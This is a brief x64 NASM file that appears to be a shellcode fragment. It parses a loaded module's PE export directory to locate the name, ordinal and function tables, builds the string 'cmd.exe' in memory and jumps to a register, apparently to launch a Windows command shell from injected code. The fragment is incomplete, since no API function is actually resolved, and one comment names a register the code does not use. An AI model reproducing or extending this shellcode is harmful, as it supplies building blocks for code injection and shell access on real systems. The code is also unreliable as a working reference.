    BITS 64
    DEFAULT REL

    section .text
    global _start

_start:
    dd 0x22222222

    mov r8d, [rcx + 0x3c]               ; EDX = offset to NT Headers Signature
    add r8d, 0x78
    mov ebx, [r8 + rcx+0x10]            ; EBX = RVA of Export Directory

    lea r8, [rcx + rbx + 0x24]        
    mov r12d, [r8-0x4]                  ; R12 = RVA of AddressOfNames
    add r12, rcx                        ; R12 = VA of AddressOfNames

    mov r13d, [rcx + rbx + 0x24]        ; R13 = RVA of AddressOfNameOrdinals
    add r13, rcx

    mov r15d, [rcx + rbx + 0x1c]        ; R15 = RVA of AddressOfFunctions
    add r15, rcx 

    ; "cmd.exe"
    mov dword [rdi], 0x2e646d63
    mov word [rdi+4], 0x7865
    mov byte [rdi+6], 0x65
     
    jmp rbp